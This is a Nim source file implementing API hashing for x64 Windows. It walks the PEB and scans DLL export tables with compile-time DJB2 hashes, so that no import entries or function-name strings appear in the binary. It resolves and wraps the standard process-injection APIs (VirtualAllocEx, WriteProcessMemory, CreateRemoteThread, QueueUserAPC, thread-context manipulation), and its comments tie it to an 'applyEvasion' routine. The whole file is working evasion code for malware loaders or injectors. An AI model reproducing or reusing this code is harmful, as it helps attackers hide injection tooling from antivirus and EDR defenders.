## api_hash.nim — IAT-free Win32 resolution via DJB2 + PEB walk (x64 Windows only).
##
## Functions are resolved at runtime by walking the PEB's InLoadOrderModuleList
## and scanning each DLL's export table.  No GetProcAddress, no LoadLibrary
## strings, no IAT entries for any function in gApi.
##
## Call initApi() once at startup (before applyEvasion) to populate gApi, then
## use the call* templates in place of winim's direct bindings.

when defined(windows):
  import winim/lean

  # ── Compile-time DJB2 hash helpers (strings are eliminated from the binary) ─

  func ctHashFn(s: string): uint32 {.compileTime.} =
    ## DJB2 addition variant, case-sensitive (for export table names).
    result = 5381u32
    for c in s:
      result = result * 33u32 + uint32(ord(c))

  func ctHashDll(s: string): uint32 {.compileTime.} =
    ## DJB2 addition variant, case-insensitive (for PEB DLL wide-char names).
    result = 5381u32
    for c in s:
      let b = uint32(ord(c))
      let lo = if b >= 65u32 and b <= 90u32: b + 32u32 else: b
      result = result * 33u32 + lo

  # Compile-time constants — function name hash values
  const
    H_VirtualAlloc        = ctHashFn("VirtualAlloc")
    H_VirtualAllocEx      = ctHashFn("VirtualAllocEx")
    H_VirtualProtect      = ctHashFn("VirtualProtect")
    H_VirtualProtectEx    = ctHashFn("VirtualProtectEx")
    H_VirtualFree         = ctHashFn("VirtualFree")
    H_WriteProcessMemory  = ctHashFn("WriteProcessMemory")
    H_ReadProcessMemory   = ctHashFn("ReadProcessMemory")
    H_CreateRemoteThread  = ctHashFn("CreateRemoteThread")
    H_OpenProcess         = ctHashFn("OpenProcess")
    H_OpenThread          = ctHashFn("OpenThread")
    H_SuspendThread       = ctHashFn("SuspendThread")
    H_ResumeThread        = ctHashFn("ResumeThread")
    H_GetThreadContext    = ctHashFn("GetThreadContext")
    H_SetThreadContext    = ctHashFn("SetThreadContext")
    H_QueueUserAPC        = ctHashFn("QueueUserAPC")
    H_CreateThread        = ctHashFn("CreateThread")
    H_WaitForSingleObject = ctHashFn("WaitForSingleObject")
    H_CloseHandle         = ctHashFn("CloseHandle")
    H_TerminateProcess    = ctHashFn("TerminateProcess")
    H_CreateProcessW      = ctHashFn("CreateProcessW")
    H_LoadLibraryA        = ctHashFn("LoadLibraryA")
    H_GetProcAddress      = ctHashFn("GetProcAddress")

  # ── Runtime DJB2 — used in export table scan ─────────────────────────────────

  proc djb2CStr(p: ptr byte): uint32 {.inline.} =
    ## DJB2 of null-terminated ASCII string (case-sensitive).
    result = 5381u32
    var arr = cast[ptr UncheckedArray[byte]](p)
    var i = 0
    while arr[i] != 0:
      result = result * 33u32 + arr[i].uint32
      inc i

  proc djb2WideHashLower(buf: ptr uint16; lenBytes: uint32): uint32 {.inline.} =
    ## DJB2 of a wide-string buffer, lowercased (takes low byte of each WCHAR).
    ## Used to hash DLL names from PEB's BaseDllName.{Buffer,Length}.
    result = 5381u32
    let nChars = lenBytes div 2u32
    let arr = cast[ptr UncheckedArray[uint16]](buf)
    for i in 0u32 ..< nChars:
      let lo = uint8(arr[i] and 0xFF'u16)
      let c  = if lo >= 65u8 and lo <= 90u8: lo + 32u8 else: lo
      result = result * 33u32 + c.uint32

  # ── PEB access via gs:[0x60] — no IAT entry, no external call ───────────────

  proc getPEB(): pointer {.asmNoStackFrame.} =
    ## Read the PEB pointer from TEB.ProcessEnvironmentBlock (GS:[0x60]).
    ## Uses Intel syntax via GAS directive; works with x86_64-w64-mingw32-gcc.
    asm """
      .intel_syntax noprefix
      mov rax, qword ptr gs:[0x60]
      ret
      .att_syntax prefix
    """

  # ── Export table scanner ─────────────────────────────────────────────────────
  #
  # PE32+ (x64) offsets used:
  #   base + 0x3C        = e_lfanew
  #   nt  + 0x00         = Signature (4 bytes, must be 0x00004550)
  #   nt  + 0x88         = DataDirectory[0].VirtualAddress  (export dir RVA)
  #   nt  + 0x8C         = DataDirectory[0].Size
  #   exp + 0x18         = NumberOfNames
  #   exp + 0x1C         = AddressOfFunctions RVA
  #   exp + 0x20         = AddressOfNames RVA
  #   exp + 0x24         = AddressOfNameOrdinals RVA

  proc resolveExport(base: uint; fnHash: uint32): uint =
    ## Scan one PE image's export table for fnHash.
    ## Returns the function VA, or 0 if not found / all matches are forwarders.
    result = 0
    if base == 0: return
    if cast[ptr uint16](base)[] != 0x5A4D'u16: return   # DOS magic
    let eLfaNew = cast[ptr uint32](base + 0x3C'u)[].uint
    let nt = base + eLfaNew
    if cast[ptr uint32](nt)[] != 0x0000_4550'u32: return  # PE sig
    # DataDirectory[0].VirtualAddress for PE32+ (x64) is at NT+0x88
    let expRVA  = cast[ptr uint32](nt + 0x88'u)[].uint
    if expRVA == 0: return
    let expSize = cast[ptr uint32](nt + 0x8C'u)[].uint
    let exp     = base + expRVA
    let numNames   = cast[ptr uint32](exp + 0x18'u)[].uint
    let fnArrRVA   = cast[ptr uint32](exp + 0x1C'u)[].uint
    let nameArrRVA = cast[ptr uint32](exp + 0x20'u)[].uint
    let ordArrRVA  = cast[ptr uint32](exp + 0x24'u)[].uint
    if fnArrRVA == 0 or nameArrRVA == 0 or ordArrRVA == 0: return
    let fnArr   = base + fnArrRVA
    let nameArr = base + nameArrRVA
    let ordArr  = base + ordArrRVA
    for i in 0u ..< numNames:
      let nameRVA = cast[ptr uint32](nameArr + i * 4'u)[].uint
      let h = djb2CStr(cast[ptr byte](base + nameRVA))
      if h != fnHash: continue
      let ord   = cast[ptr uint16](ordArr + i * 2'u)[].uint
      let fnRVA = cast[ptr uint32](fnArr + ord * 4'u)[].uint
      # Forwarder check: RVA inside the export directory itself → skip
      if fnRVA >= expRVA and fnRVA < expRVA + expSize: continue
      return base + fnRVA
    return 0

  # ── PEB walk — resolves any function by scanning all loaded modules ──────────
  #
  # Walking ALL modules (not just kernel32) handles kernel32→kernelbase
  # forwarders transparently: resolveExport skips forwarder entries, so the
  # loop naturally reaches kernelbase and finds the real implementation.
  #
  # LDR_DATA_TABLE_ENTRY offsets (x64):
  #   +0x00 InLoadOrderLinks.Flink   (LIST_ENTRY.Flink, next entry pointer)
  #   +0x30 DllBase
  #   +0x58 BaseDllName.Length  (USHORT, byte count of wide string)
  #   +0x60 BaseDllName.Buffer  (PWSTR)

  proc pebResolve*(fnHash: uint32): pointer =
    ## Find function by hash, scanning all PEB-loaded modules.
    ## No IAT entry generated; no GetProcAddress call.
    let peb = getPEB()
    if peb == nil: return nil
    let ldr = cast[ptr uint](cast[uint](peb) + 0x18'u)[]
    if ldr == 0: return nil
    let listHead = ldr + 0x10'u
    var flink = cast[ptr uint](listHead)[]
    while flink != 0 and flink != listHead:
      let dllBase = cast[ptr uint](flink + 0x30'u)[]
      if dllBase != 0:
        let res = resolveExport(dllBase, fnHash)
        if res != 0: return cast[pointer](res)
      flink = cast[ptr uint](flink)[]
    return nil

  proc pebGetModule*(dllHash: uint32): pointer =
    ## Find a DLL base address by case-insensitive hash of its name.
    let peb = getPEB()
    if peb == nil: return nil
    let ldr = cast[ptr uint](cast[uint](peb) + 0x18'u)[]
    if ldr == 0: return nil
    let listHead = ldr + 0x10'u
    var flink = cast[ptr uint](listHead)[]
    while flink != 0 and flink != listHead:
      let dllBase = cast[ptr uint](flink + 0x30'u)[]
      let nameLen = cast[ptr uint16](flink + 0x58'u)[]
      let nameBuf = cast[ptr uint](flink + 0x60'u)[]
      if dllBase != 0 and nameBuf != 0 and nameLen > 0:
        let h = djb2WideHashLower(cast[ptr uint16](nameBuf), nameLen.uint32)
        if h == dllHash: return cast[pointer](dllBase)
      flink = cast[ptr uint](flink)[]
    return nil

  # ── API table ─────────────────────────────────────────────────────────────────

  type ApiTable* = object
    VirtualAlloc*:        pointer
    VirtualAllocEx*:      pointer
    VirtualProtect*:      pointer
    VirtualProtectEx*:    pointer
    VirtualFree*:         pointer
    WriteProcessMemory*:  pointer
    ReadProcessMemory*:   pointer
    CreateRemoteThread*:  pointer
    OpenProcess*:         pointer
    OpenThread*:          pointer
    SuspendThread*:       pointer
    ResumeThread*:        pointer
    GetThreadContext*:    pointer
    SetThreadContext*:    pointer
    QueueUserAPC*:        pointer
    CreateThread*:        pointer
    WaitForSingleObject*: pointer
    CloseHandle*:         pointer
    TerminateProcess*:    pointer
    CreateProcessW*:      pointer
    LoadLibraryA*:        pointer
    GetProcAddress*:      pointer

  var gApi*: ApiTable

  proc initApi*() =
    ## Resolve all API function pointers via PEB walk + export table scan.
    ## Must be called once at process start before any call* template is used.
    gApi.VirtualAlloc        = pebResolve(H_VirtualAlloc)
    gApi.VirtualAllocEx      = pebResolve(H_VirtualAllocEx)
    gApi.VirtualProtect      = pebResolve(H_VirtualProtect)
    gApi.VirtualProtectEx    = pebResolve(H_VirtualProtectEx)
    gApi.VirtualFree         = pebResolve(H_VirtualFree)
    gApi.WriteProcessMemory  = pebResolve(H_WriteProcessMemory)
    gApi.ReadProcessMemory   = pebResolve(H_ReadProcessMemory)
    gApi.CreateRemoteThread  = pebResolve(H_CreateRemoteThread)
    gApi.OpenProcess         = pebResolve(H_OpenProcess)
    gApi.OpenThread          = pebResolve(H_OpenThread)
    gApi.SuspendThread       = pebResolve(H_SuspendThread)
    gApi.ResumeThread        = pebResolve(H_ResumeThread)
    gApi.GetThreadContext    = pebResolve(H_GetThreadContext)
    gApi.SetThreadContext    = pebResolve(H_SetThreadContext)
    gApi.QueueUserAPC        = pebResolve(H_QueueUserAPC)
    gApi.CreateThread        = pebResolve(H_CreateThread)
    gApi.WaitForSingleObject = pebResolve(H_WaitForSingleObject)
    gApi.CloseHandle         = pebResolve(H_CloseHandle)
    gApi.TerminateProcess    = pebResolve(H_TerminateProcess)
    gApi.CreateProcessW      = pebResolve(H_CreateProcessW)
    gApi.LoadLibraryA        = pebResolve(H_LoadLibraryA)
    gApi.GetProcAddress      = pebResolve(H_GetProcAddress)

  # ── Typed call templates ──────────────────────────────────────────────────────
  #
  # Each template casts gApi.<Fn> to the correct stdcall proc type and calls it.
  # Using the template at the call site generates no IAT entry for the function.

  template callVirtualAlloc*(lpAddress: LPVOID; dwSize: SIZE_T;
                              flAllocType, flProtect: DWORD): LPVOID =
    cast[proc(a: LPVOID; b: SIZE_T; c, d: DWORD): LPVOID {.stdcall.}](
      gApi.VirtualAlloc)(lpAddress, dwSize, flAllocType, flProtect)

  template callVirtualAllocEx*(hProcess: HANDLE; lpAddress: LPVOID;
                                dwSize: SIZE_T;
                                flAllocType, flProtect: DWORD): LPVOID =
    cast[proc(a: HANDLE; b: LPVOID; c: SIZE_T; d, e: DWORD): LPVOID {.stdcall.}](
      gApi.VirtualAllocEx)(hProcess, lpAddress, dwSize, flAllocType, flProtect)

  template callVirtualProtect*(lpAddress: LPVOID; dwSize: SIZE_T;
                                flNewProtect: DWORD;
                                lpOldProtect: PDWORD): WINBOOL =
    cast[proc(a: LPVOID; b: SIZE_T; c: DWORD; d: PDWORD): WINBOOL {.stdcall.}](
      gApi.VirtualProtect)(lpAddress, dwSize, flNewProtect, lpOldProtect)

  template callVirtualProtectEx*(hProcess: HANDLE; lpAddress: LPVOID;
                                  dwSize: SIZE_T; flNewProtect: DWORD;
                                  lpOldProtect: PDWORD): WINBOOL =
    cast[proc(a: HANDLE; b: LPVOID; c: SIZE_T; d: DWORD; e: PDWORD): WINBOOL {.stdcall.}](
      gApi.VirtualProtectEx)(hProcess, lpAddress, dwSize, flNewProtect, lpOldProtect)

  template callVirtualFree*(lpAddress: LPVOID; dwSize: SIZE_T;
                             dwFreeType: DWORD): WINBOOL =
    cast[proc(a: LPVOID; b: SIZE_T; c: DWORD): WINBOOL {.stdcall.}](
      gApi.VirtualFree)(lpAddress, dwSize, dwFreeType)

  template callWriteProcessMemory*(hProcess: HANDLE; lpBase: LPVOID;
                                   lpBuf: LPCVOID; nSize: SIZE_T;
                                   lpWritten: ptr SIZE_T): WINBOOL =
    cast[proc(a: HANDLE; b: LPVOID; c: LPCVOID; d: SIZE_T;
              e: ptr SIZE_T): WINBOOL {.stdcall.}](
      gApi.WriteProcessMemory)(hProcess, lpBase, lpBuf, nSize, lpWritten)

  template callReadProcessMemory*(hProcess: HANDLE; lpBase: LPCVOID;
                                  lpBuf: LPVOID; nSize: SIZE_T;
                                  lpRead: ptr SIZE_T): WINBOOL =
    cast[proc(a: HANDLE; b: LPCVOID; c: LPVOID; d: SIZE_T;
              e: ptr SIZE_T): WINBOOL {.stdcall.}](
      gApi.ReadProcessMemory)(hProcess, lpBase, lpBuf, nSize, lpRead)

  template callCreateRemoteThread*(hProcess: HANDLE; lpSec: LPSECURITY_ATTRIBUTES;
                                   dwStack: SIZE_T; lpStart: LPVOID;
                                   lpParam: LPVOID; dwFlags: DWORD;
                                   lpTid: LPDWORD): HANDLE =
    cast[proc(a: HANDLE; b: LPSECURITY_ATTRIBUTES; c: SIZE_T;
              d, e: LPVOID; f: DWORD; g: LPDWORD): HANDLE {.stdcall.}](
      gApi.CreateRemoteThread)(hProcess, lpSec, dwStack, lpStart, lpParam,
                               dwFlags, lpTid)

  template callOpenProcess*(dwAccess: DWORD; bInherit: WINBOOL;
                            dwPid: DWORD): HANDLE =
    cast[proc(a: DWORD; b: WINBOOL; c: DWORD): HANDLE {.stdcall.}](
      gApi.OpenProcess)(dwAccess, bInherit, dwPid)

  template callOpenThread*(dwAccess: DWORD; bInherit: WINBOOL;
                           dwTid: DWORD): HANDLE =
    cast[proc(a: DWORD; b: WINBOOL; c: DWORD): HANDLE {.stdcall.}](
      gApi.OpenThread)(dwAccess, bInherit, dwTid)

  template callSuspendThread*(hThread: HANDLE): DWORD =
    cast[proc(a: HANDLE): DWORD {.stdcall.}](gApi.SuspendThread)(hThread)

  template callResumeThread*(hThread: HANDLE): DWORD =
    cast[proc(a: HANDLE): DWORD {.stdcall.}](gApi.ResumeThread)(hThread)

  template callGetThreadContext*(hThread: HANDLE; lpCtx: LPCONTEXT): WINBOOL =
    cast[proc(a: HANDLE; b: LPCONTEXT): WINBOOL {.stdcall.}](
      gApi.GetThreadContext)(hThread, lpCtx)

  template callSetThreadContext*(hThread: HANDLE; lpCtx: LPCONTEXT): WINBOOL =
    cast[proc(a: HANDLE; b: LPCONTEXT): WINBOOL {.stdcall.}](
      gApi.SetThreadContext)(hThread, lpCtx)

  template callQueueUserAPC*(pfnAPC: LPVOID; hThread: HANDLE;
                             dwData: ULONG_PTR): DWORD =
    cast[proc(a: LPVOID; b: HANDLE; c: ULONG_PTR): DWORD {.stdcall.}](
      gApi.QueueUserAPC)(pfnAPC, hThread, dwData)

  template callCreateThread*(lpSec: LPSECURITY_ATTRIBUTES; dwStack: SIZE_T;
                             lpStart: LPVOID; lpParam: LPVOID;
                             dwFlags: DWORD; lpTid: LPDWORD): HANDLE =
    cast[proc(a: LPSECURITY_ATTRIBUTES; b: SIZE_T; c, d: LPVOID;
              e: DWORD; f: LPDWORD): HANDLE {.stdcall.}](
      gApi.CreateThread)(lpSec, dwStack, lpStart, lpParam, dwFlags, lpTid)

  template callWaitForSingleObject*(hHandle: HANDLE; dwMs: DWORD): DWORD =
    cast[proc(a: HANDLE; b: DWORD): DWORD {.stdcall.}](
      gApi.WaitForSingleObject)(hHandle, dwMs)

  template callCloseHandle*(hObject: HANDLE): WINBOOL =
    cast[proc(a: HANDLE): WINBOOL {.stdcall.}](gApi.CloseHandle)(hObject)

  template callTerminateProcess*(hProcess: HANDLE; uExitCode: UINT): WINBOOL =
    cast[proc(a: HANDLE; b: UINT): WINBOOL {.stdcall.}](
      gApi.TerminateProcess)(hProcess, uExitCode)

  template callCreateProcessW*(lpApp: LPCWSTR; lpCmd: LPWSTR;
                               lpProcAttr, lpThreadAttr: LPSECURITY_ATTRIBUTES;
                               bInherit: WINBOOL; dwFlags: DWORD;
                               lpEnv, lpDir: LPVOID;
                               lpSi: LPSTARTUPINFOW;
                               lpPi: LPPROCESS_INFORMATION): WINBOOL =
    cast[proc(a: LPCWSTR; b: LPWSTR; c, d: LPSECURITY_ATTRIBUTES;
              e: WINBOOL; f: DWORD; g, h: LPVOID;
              i: LPSTARTUPINFOW; j: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}](
      gApi.CreateProcessW)(lpApp, lpCmd, lpProcAttr, lpThreadAttr, bInherit,
                           dwFlags, lpEnv, lpDir, lpSi, lpPi)
